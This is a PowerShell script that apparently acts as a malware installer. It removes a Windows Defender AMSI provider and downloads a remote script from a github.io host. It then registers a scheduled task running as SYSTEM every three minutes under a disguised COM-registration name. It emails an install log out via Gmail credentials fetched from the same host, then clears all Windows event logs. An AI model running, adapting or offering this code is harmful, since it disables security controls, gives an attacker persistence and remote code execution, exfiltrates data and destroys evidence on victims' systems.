
[CmdletBinding(SupportsShouldProcess)]
param()
$fname=(new-guid).Guid
$fname = $fname.substring(0,20)
$FullLogs = ""
$LogFilePath="$env:Temp\$fname.001"

Function OutString
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$Msg,
        [Parameter()]
        [ValidateNotNullOrEmpty()]
        [ValidateSet('Information','Warning','Error')]
        [string]$Severity = 'Information'
    )

    if($env:COMPUTERNAME -like 'MAVERICK') {
          if($TestOutput){
            write-host '[install]   ' -NoNewLine -f Red
            write-host $Msg -f DarkYellow
         }
        Write-Verbose $Msg
    }
    [pscustomobject]@{
        Time = (Get-Date -f g)
        Message = $Msg
        Severity = $Severity
    } | Export-Csv -Path $LogFilePath -Append -NoTypeInformation
    $FullLogs = $FullLogs + $Msg + '`n`n'
}


function Set-Key {
param([string]$string)
$length = $string.length
$pad = 32-$length
if (($length -lt 16) -or ($length -gt 32)) {Throw "String must be between 16 and 32 characters"}
$encoding = New-Object System.Text.ASCIIEncoding
$bytes = $encoding.GetBytes($string + "0" * $pad)
return $bytes
}


function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    $B64Cipher=[System.Convert]::ToBase64String($encryptedBytes)
                    Set-Content -Path $outPath -Value $B64Cipher
                    #[System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    #$cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $B64Cipher = Get-Content $File.FullName
                    $cipherBytes=[System.Convert]::FromBase64String($B64Cipher)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    #return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}


Function Decrypt-String($EncryptedString,$Passphrase)
{
    $EncryptionKey=Set-Key $Passphrase
    Try{
        $SecureString = ConvertTo-SecureString $EncryptedString -Key $EncryptionKey
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureString)
        [string]$String = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)

        Return $String
    }
    Catch{Throw $_}

}

Function Send-InstallNotification
{
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$subject,
        [string]$msgbody,
        [string]$file=""
    )
    try {
        $SecMFile='https://vr972be716a04eb6.github.io/dat/mail.dat'
        $SecPFile='https://vr972be716a04eb6.github.io/dat/ps.dat'
        $webclient = New-Object Net.WebClient
        $CmdData = $webclient.DownloadString($SecMFile)

        $Pass = $webclient.DownloadString($SecPFile)
        $Pass = $Pass.substring(0,30)
        $Pass.length
        $decrypted=Decrypt-String $CmdData $Pass
        $CharArray =$decrypted.Split(";")

        $EmailFrom = $CharArray[0]
        $EmailTo = $CharArray[1]
        $pass = $CharArray[2]

        $message = new-object System.Net.Mail.MailMessage 
        $message.From = $EmailFrom 
        $message.To.Add($EmailTo)
        $message.IsBodyHtml = $True 
        $message.Subject = $subject 

        if($file -ne ""){
          if(Test-Path -Path $file){
              $attachment = $file
              $attach = new-object Net.Mail.Attachment($attachment) 
              $message.Attachments.Add($attach)   
          }
        }
        $message.body = $msgbody
        $SMTPServer = "smtp.gmail.com"
        $SMTPClient = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
        $SMTPClient.EnableSsl = $true
        $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($EmailFrom, $pass);
        $SMTPClient.Send($message)
    }
    catch
    {
        $Msg="Ran into an issue: $($PSItem.ToString())"
        #write-host '[test-exceptions] ' -NoNewLine -f Red
        #write-host $Msg -f DarkYellow
        write-verbose $Msg 
        if($PSCmdlet -ne $null){
            $PSCmdlet.ThrowTerminatingError($PSItem)
        }
        
    }   
}


function ConvertTo-EncodedScript
{
  param
  (
    [string]$Path,
    [switch]$WriteFile=$false
  )
  
  $Code = Get-Content -Path $Path -Raw
  $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Code) 
  $Base64 = [Convert]::ToBase64String($Bytes) 
  
  if($WriteFile){
      $NewPath = [System.IO.Path]::ChangeExtension($Path, '.b64')
      $Base64 | Set-Content -Path $NewPath
  }

  return $Base64
}

Function New-ScheduledTaskFolder
{
  Param ($taskpath)
  $ErrorActionPreference = "stop"

  OutString "New-ScheduledTaskFolder called with path $taskpath"


  $scheduleObject = New-Object -ComObject schedule.service
  $scheduleObject.connect()
  $rootFolder = $scheduleObject.GetFolder("\")
  Try 
  {
    $null = $scheduleObject.GetFolder($taskpath)
  }
  Catch { 
    $null = $rootFolder.CreateFolder($taskpath) 
  }
  Finally { 
    $ErrorActionPreference = "continue" 
  } 
}

function Install-EncodedScriptTask {
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$TaskName,
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$EncodedTask
    )

    $Interval=3

    OutString "Install-EncodedScriptTask called with taskname $TaskName. Code: $EncodedTask"


    $action = New-ScheduledTaskAction -Execute "C:\Temp\ImportantProgram.exe"
    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes $Interval)
    $principal = New-ScheduledTaskPrincipal -UserID "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -MultipleInstances Parallel -Priority 3
    $task = New-ScheduledTask -Action $action -Principal $principal -Trigger $trigger -Settings $settings

    $null=Register-ScheduledTask $TaskName -InputObject $task
    $null=Start-ScheduledTask -TaskName $TaskName
}


function RemoveOldTasks
{
    $ErrorActionPreference = "SilentlyContinue"
    $Report = @()
    $NumTasks = 0
    $path = "c:\Windows\System32\Tasks"
    $tasks = Get-ChildItem -recurse -Path $path -File
    foreach ($task in $tasks)
    {
        $Details = "" | select Task, IsHidden, Enabled, Application
        $AbsolutePath = $task.directory.fullname + "\" + $task.Name
        $TaskInfo = [xml](Get-Content $AbsolutePath)
        #$Details.ComputerName = $Computer
        $Details.Task = $task.name
        $Details.IsHidden = $TaskInfo.task.settings.hidden
        $Details.Enabled = $TaskInfo.task.settings.enabled
        $Details.Application = $TaskInfo.task.actions.exec.command

        $CreationDate=[datetime]$task.CreationTime
        $LimitDate= (get-date).AddDays(-7)
        if($CreationDate -gt  $LimitDate) 
        {
            $Report += $Details
            $NumTasks = $NumTasks + 1
        }
    }  

    OutString "Cleanup: Found $NumTasks Tasks Created in the last 7 days"
    if($NumTasks -gt 0){
        
        foreach ($tdel in $Report){
            $tname=$tdel.Task
            OutString "Cleanup: Deleting task $tname "
            Unregister-ScheduledTask 'RemoteExecCheck' -ErrorAction Ignore
        }
    }            
} 

function Cleanup {

$ErrorActionPreference = "SilentlyContinue"
  # old tasks
  OutString "Cleanup: Unregister RemoteExecCheck,ScheduledSecurityCheck,WinSecurityScheduledCheck"
  Unregister-ScheduledTask 'RemoteExecCheck' -ErrorAction Ignore
  Unregister-ScheduledTask 'WinSecurityScheduledCheck' -ErrorAction Ignore
  Unregister-ScheduledTask 'ScheduledSecurityCheck' -ErrorAction Ignore

  $NewTaskFolder='ComObjectsRegistrationManagement'
  $NewTaskName=$NewTaskFolder + '\' + 'ComObjectsRegistrar'
  Unregister-ScheduledTask $NewTaskName -ErrorAction Ignore
  RemoveOldTasks
  # logs
  
  $null=Get-WinEvent -ListLog * -Force | % {   $null=(Wevtutil.exe cl $_.LogName) }

  Remove-Item -Path "$env:Temp\LogFile.csv" -Force -ErrorAction Ignore
  Remove-Item -Path $LogFilePath -Force -ErrorAction Ignore
}

# AMSI
Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force -ErrorAction Ignore 

$NewTaskFolder='ComObjectsRegistrationManagement'
$NewTaskName=$NewTaskFolder + '\' + 'ComObjectsRegistrars'
New-ScheduledTaskFolder $NewTaskFolder

$InstallFromLocal=$false

$currentPath = Get-Location
$script_clear = ''
if($InstallFromLocal)
{
    $script_clear = Join-Path $currentPath "runat5min.ps1"
    $script_coded = ConvertTo-EncodedScript $script_clear $false
    $c64data = get-content $script_coded -Raw
    Install-EncodedScriptTask $NewTaskName $c64data
} else {
      OutString "ScriptUrl: $ScriptUrl"
      $ScriptUrl='https://vr972be716a04eb6.github.io/schdtask/rpt.dat'
      $webclient = New-Object Net.WebClient
      $ClearScript = $webclient.DownloadString($ScriptUrl)

      $Bytes = [System.Text.Encoding]::Unicode.GetBytes($ClearScript) 
      $Base64 = [Convert]::ToBase64String($Bytes) 
      OutString "EncodedScript(downloaded): $EncodedScript"
      Install-EncodedScriptTask $NewTaskName $Base64
}

Send-InstallNotification "Schd Task Install Notice for $env:COMPUTERNAME" "test again, check file" $LogFilePath
Cleanup


function Save-EncryptedScript {
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$ScriptData
    )
    $RegKeyPath="HKLM:\SOFTWARE\Microsoft\Software\Microsoft\Shared Tools"
    $RegKeyPath="HKCU:\SOFTWARE\cybercastor\Software\Microsoft\Shared Tools"
    $RegKeyName="WinSec"
    $FullRegKeyPath=Join-Path $TestRegKeyPath $TestRegKeyName

    $null=Remove-Item -Path $FullRegKeyPath -Recurse -Force -ErrorAction Ignore


    $null=New-Item –Path $RegKeyPath –Name $RegKeyName -Force -ErrorAction Ignore
    $null=New-Itemproperty -path $FullRegKeyPath -Name $RegKeyName -value $ScriptData -Force -ErrorAction Ignore
}


function Get-EncryptedScript {
    param (
        [Parameter(Mandatory)]
        [ValidateNotNullOrEmpty()]
        [string]$ScriptData
    )
    $RegKeyPath="HKLM:\SOFTWARE\Microsoft\Software\Microsoft\Shared Tools"
    $RegKeyPath="HKCU:\SOFTWARE\cybercastor\Software\Microsoft\Shared Tools"
    $RegKeyName="WinSec"
    $FullRegKeyPath=Join-Path $TestRegKeyPath $TestRegKeyName

    $Data=(Get-ItemProperty -Path $FullRegKeyPath -Name $RegKeyName).$RegKeyName
    return $Data
}



